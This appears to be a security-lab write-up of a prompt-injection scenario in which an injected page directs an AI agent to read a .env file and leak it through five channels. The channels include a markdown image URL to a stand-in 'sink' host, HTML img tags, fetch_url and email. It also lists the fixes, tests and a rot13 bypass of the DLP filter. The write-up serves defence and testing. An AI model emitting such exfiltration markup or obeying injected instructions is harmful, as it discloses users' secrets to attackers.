# S3: Data exfiltration

**Maps to:** LLM02, LLM05 · ASI02 · AML.T0086, AML.T0025 · mitigation AML.M0033 ([mapping](../mapping.md))

## The flaw
Three outbound channels with no destination control: the chat client auto-loads images in the agent's markdown answer, `fetch_url` will request any URL, and `send_email` will mail anyone.

## The attack
An injected page tells the agent to read `.env` and leak it through one of five forms: a markdown image `![x](http://sink/pixel.png?d=<data>)`, a reference-style image, an HTML `<img>`, a `fetch_url` call with the data in the query string, or an email to the attacker. The image channels need no tool call at all: the user's own client makes the request when it renders the answer.

## Impact
Silent secret disclosure to an attacker-controlled host.

## The fix (`fixes/s3_egress`)
| Channel | Control |
|---|---|
| answer markup | `sanitize_markdown`: remove images (inline, reference-style, HTML), non-allow-listed links, `<script>/<iframe>/<object>` blocks; redact secrets |
| `fetch_url` | host:port allow-list + DLP on the URL |
| `send_email` | recipient-domain allow-list + DLP on subject and body |

## Evidence
`tests/test_s3_exfiltration.py` (25 tests, 24 passing + 1 documented bypass): all five channels leak on the vulnerable agent; the fix stops every one, and the image channel is stopped at render time rather than by the model behaving. Normal work (allow-listed email and link) still functions. The DLP catches plain, URL-encoded and base64 forms.

## Known bypass (tested as `xfail(strict)`)
DLP is pattern-based. A rot13-encoded secret passes it. That is why the allow-lists are the real control and DLP is a backstop; an allow-listed host the attacker can also write to would still be a channel.

## What this does not show
Real-model rates (`attacks/s3_exfiltration/exploit.py` exists, unrun) and network-level egress enforcement (the compose `internal` network and a future egress proxy are the backstop).
